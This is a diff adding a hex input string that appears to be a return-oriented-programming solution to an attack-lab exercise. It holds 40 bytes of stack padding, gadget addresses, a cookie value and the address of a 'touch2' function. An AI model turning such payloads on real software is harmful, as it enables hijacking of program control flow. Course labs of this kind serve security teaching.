@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /*padding 40 btyes*/
+e2 16 40 00 00 00 00 00 /*gadget1: popq %rax address will start at last byte */
+0d ef e0 40 00 00 00 00 */cookie*/
+04 17 40 00 00 00 00 00 /*gadget*/
+1a 15 40 00 00 00 00 00 /*touch2address*/
